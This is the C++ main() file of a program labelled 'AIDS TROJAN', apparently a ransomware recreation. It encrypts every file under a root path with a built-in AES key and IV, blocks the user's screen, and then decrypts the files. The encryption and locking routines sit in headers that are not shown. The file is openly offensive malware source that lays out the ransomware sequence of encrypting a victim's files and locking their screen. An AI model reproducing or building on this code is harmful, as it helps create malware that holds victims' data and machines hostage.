#include <iostream>
#include <string>
#include <conio.h>
#include "service/EncryptorService.h"
#include "service/AESEncryptor.h"
#include "view/ScreenBlocker.h"

using namespace std;
using namespace std::filesystem;

int main (){
    cout << "****************** AIDS TROJAN ******************" << endl;

    ScreenBlocker screenBlocker;
    EncryptorService* encryptorService = new AESEncryptor(AESEncryptor::KEY, AESEncryptor::IV);

    encryptorService->encryptFilesIn(encryptorService->getRootPath());

    screenBlocker.blockScreen();

    encryptorService->decryptFilesIn(encryptorService->getRootPath());

    delete encryptorService;
    encryptorService = NULL;
    return 0;
}




